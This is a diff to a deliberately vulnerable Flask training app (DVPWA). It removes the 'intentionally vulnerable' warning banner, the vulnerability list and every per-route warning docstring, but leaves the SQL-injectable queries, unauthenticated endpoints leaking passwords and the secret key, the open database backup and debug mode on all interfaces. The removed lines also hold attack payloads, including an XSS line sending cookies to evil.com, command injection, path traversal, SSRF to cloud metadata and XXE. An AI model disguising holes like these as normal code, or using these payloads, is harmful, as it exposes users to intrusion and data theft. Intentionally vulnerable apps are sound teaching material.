@@ -1,25 +1,3 @@
-"""
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                    DAMN VULNERABLE PYTHON WEB APP (DVPWA)                     ║
-║                                                                               ║
-║      WARNING: This application is INTENTIONALLY VULNERABLE!                   ║
-║      DO NOT deploy to production or expose to the internet.                   ║
-║      Use only for educational purposes in isolated environments.              ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-
-Vulnerabilities included:
-1. SQL Injection (SQLi)
-2. Cross-Site Scripting (XSS) - Reflected & Stored
-3. Command Injection
-4. Insecure Direct Object Reference (IDOR)
-5. Broken Authentication
-6. Sensitive Data Exposure
-7. XML External Entity (XXE)
-8. Path Traversal / Local File Inclusion (LFI)
-9. Server-Side Request Forgery (SSRF)
-10. Insecure Deserialization
-"""
-
 import os
 import pickle
 import base64
@@ -132,16 +110,11 @@ def login_required(f):
 
 @app.route('/')
 def index():
-    """Home page."""
     return render_template('index.html')
 
 
 @app.route('/login', methods=['GET', 'POST'])
 def login():
-    """
-    VULNERABILITY: SQL Injection in login
-    Try: admin' OR '1'='1' -- 
-    """
     error = None
     if request.method == 'POST':
         username = request.form.get('username', '')
@@ -170,14 +143,12 @@ def login():
 
 @app.route('/register', methods=['GET', 'POST'])
 def register():
-    """User registration - multiple vulnerabilities."""
     if request.method == 'POST':
         username = request.form.get('username', '')
         password = request.form.get('password', '')
         email = request.form.get('email', '')
         
         db = get_db()
-        # VULNERABILITY: SQL Injection
         query = f"INSERT INTO users (username, password, email) VALUES ('{username}', '{password}', '{email}')"
         
         try:
@@ -193,7 +164,6 @@ def register():
 
 @app.route('/logout')
 def logout():
-    """Logout user."""
     session.clear()
     return redirect(url_for('index'))
 
@@ -201,7 +171,6 @@ def logout():
 @app.route('/dashboard')
 @login_required
 def dashboard():
-    """User dashboard."""
     db = get_db()
     posts = db.execute('SELECT * FROM posts ORDER BY created_at DESC').fetchall()
     return render_template('dashboard.html', posts=posts)
@@ -209,10 +178,6 @@ def dashboard():
 
 @app.route('/search')
 def search():
-    """
-    VULNERABILITY: Reflected XSS
-    Try: <script>alert('XSS')</script>
-    """
     query = request.args.get('q', '')
     results = []
     
@@ -232,10 +197,6 @@ def search():
 @app.route('/post/new', methods=['GET', 'POST'])
 @login_required
 def new_post():
-    """
-    VULNERABILITY: Stored XSS
-    Try posting: <script>document.location='http://evil.com?c='+document.cookie</script>
-    """
     if request.method == 'POST':
         title = request.form.get('title', '')
         content = request.form.get('content', '')
@@ -255,10 +216,6 @@ def new_post():
 @app.route('/profile/<int:user_id>')
 @login_required
 def profile(user_id):
-    """
-    VULNERABILITY: Insecure Direct Object Reference (IDOR)
-    Access any user's profile by changing the ID
-    """
     db = get_db()
     user = db.execute(f'SELECT * FROM users WHERE id = {user_id}').fetchone()
     secrets = db.execute(f'SELECT * FROM secrets WHERE user_id = {user_id}').fetchall()
@@ -273,10 +230,6 @@ def profile(user_id):
 @app.route('/admin')
 @login_required
 def admin():
-    """
-    VULNERABILITY: Broken Access Control
-    Only checks if logged in, not if user is admin
-    """
     db = get_db()
     users = db.execute('SELECT * FROM users').fetchall()
     return render_template('admin.html', users=users)
@@ -285,10 +238,6 @@ def admin():
 @app.route('/cmd')
 @login_required
 def cmd():
-    """
-    VULNERABILITY: Command Injection
-    Try: 127.0.0.1; cat /etc/passwd
-    """
     host = request.args.get('host', '')
     output = ''
     
@@ -314,10 +263,6 @@ def cmd():
 @app.route('/file')
 @login_required
 def file_view():
-    """
-    VULNERABILITY: Path Traversal / Local File Inclusion
-    Try: ../../etc/passwd
-    """
     filename = request.args.get('name', '')
     content = ''
     
@@ -336,10 +281,6 @@ def file_view():
 @app.route('/download')
 @login_required
 def download():
-    """
-    VULNERABILITY: Path Traversal in file download
-    Try: ../app.py or ../../../../etc/passwd
-    """
     filename = request.args.get('file', '')
     
     if filename:
@@ -355,11 +296,6 @@ def download():
 
 @app.route('/api/fetch')
 def api_fetch():
-    """
-    VULNERABILITY: Server-Side Request Forgery (SSRF)
-    Try: http://169.254.169.254/latest/meta-data/ (AWS metadata)
-    Try: file:///etc/passwd
-    """
     url = request.args.get('url', '')
     content = ''
     
@@ -376,10 +312,6 @@ def api_fetch():
 
 @app.route('/api/deserialize', methods=['POST'])
 def deserialize():
-    """
-    VULNERABILITY: Insecure Deserialization
-    Send a malicious pickle payload to execute arbitrary code
-    """
     data = request.form.get('data', '')
     result = ''
     
@@ -397,13 +329,6 @@ def deserialize():
 
 @app.route('/api/xml', methods=['GET', 'POST'])
 def xml_parse():
-    """
-    VULNERABILITY: XML External Entity (XXE)
-    Try:
-    <?xml version="1.0"?>
-    <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
-    <data>&xxe;</data>
-    """
     result = ''
     
     if request.method == 'POST':
@@ -423,10 +348,6 @@ def xml_parse():
 
 @app.route('/api/user', methods=['GET'])
 def api_user():
-    """
-    VULNERABILITY: Sensitive data exposure via API
-    No authentication required, exposes all user data
-    """
     db = get_db()
     users = db.execute('SELECT id, username, password, email, api_key FROM users').fetchall()
     
@@ -438,9 +359,6 @@ def api_user():
 
 @app.route('/debug')
 def debug():
-    """
-    VULNERABILITY: Debug endpoint exposing sensitive information
-    """
     return {
         'secret_key': app.secret_key,
         'database': DATABASE,
@@ -452,9 +370,6 @@ def debug():
 
 @app.route('/backup')
 def backup():
-    """
-    VULNERABILITY: Exposing database backup
-    """
     return send_file(DATABASE, as_attachment=True)
 
 
@@ -464,7 +379,6 @@ def backup():
 
 @app.errorhandler(500)
 def internal_error(error):
-    """VULNERABILITY: Verbose error messages."""
     return f"""
     <h1>Internal Server Error</h1>
     <p>Error details: {error}</p>
@@ -487,36 +401,6 @@ if __name__ == '__main__':
     
     # Initialize database
     init_db()
-    
-    print("""
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                    DAMN VULNERABLE PYTHON WEB APP (DVPWA)                     ║
-╠═══════════════════════════════════════════════════════════════════════════════╣
-║  ⚠️  WARNING: This application is INTENTIONALLY VULNERABLE!                   ║
-║      DO NOT deploy to production or expose to the internet.                   ║
-╠═══════════════════════════════════════════════════════════════════════════════╣
-║  Default credentials:                                                         ║
-║    admin / admin123                                                           ║
-║    user  / password                                                           ║
-║    guest / guest                                                              ║
-╠═══════════════════════════════════════════════════════════════════════════════╣
-║  Vulnerability Endpoints:                                                     ║
-║    /login         - SQL Injection                                             ║
-║    /search        - Reflected XSS + SQLi                                      ║
-║    /post/new      - Stored XSS                                                ║
-║    /profile/<id>  - IDOR                                                      ║
-║    /admin         - Broken Access Control                                     ║
-║    /cmd           - Command Injection                                         ║
-║    /file          - Path Traversal / LFI                                      ║
-║    /download      - Path Traversal                                            ║
-║    /api/fetch     - SSRF                                                      ║
-║    /api/deserialize - Insecure Deserialization                                ║
-║    /api/xml       - XXE                                                       ║
-║    /api/user      - Sensitive Data Exposure                                   ║
-║    /debug         - Information Disclosure                                    ║
-║    /backup        - Database Exposure                                         ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-    """)
     
     # VULNERABILITY: Debug mode enabled, binding to all interfaces
     app.run(host='0.0.0.0', port=5000, debug=True)
